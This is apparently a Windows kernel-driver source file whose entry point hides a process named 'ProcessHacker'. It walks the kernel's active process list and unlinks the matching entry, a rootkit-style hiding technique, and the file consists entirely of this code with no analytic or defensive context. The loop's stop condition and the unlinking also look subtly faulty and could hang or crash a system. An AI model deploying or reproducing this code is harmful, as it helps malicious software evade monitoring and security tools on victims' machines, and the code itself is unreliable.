#include <ntddk.h> 
#include <nt.hpp> 

NTSTATUS DriverEntry(
  PDRIVER_OBJECT DriverObject, 
  PUNICODE_STRING RegistryPath
);

VOID Unload(
	PDRIVER_OBJECT DriverObject
);

VOID HideProcess(
   PCSTR ProcessName
); 

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = Unload;

	HideProcess("ProcessHacker");

	return STATUS_SUCCESS;
}

VOID Unload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("Driver Unloaded ...");
}

VOID HideProcess(PCSTR ProcessName)
{
	_PEPROCESS CurrentProcess = nullptr;

	for (PLIST_ENTRY ListEntry = PsInitialSystemProcess->ActiveProcessLinks.Flink;
		ListEntry != (PLIST_ENTRY)PsInitialSystemProcess; ListEntry = ListEntry->Flink)
	{
		CurrentProcess = CONTAINING_RECORD(ListEntry, _EPROCESS, ActiveProcessLinks);

		if (strstr((PCSTR)CurrentProcess->ImageFileName, ProcessName))
		{
			RemoveEntryList(&CurrentProcess->ActiveProcessLinks);
			break;
		}
	}
}
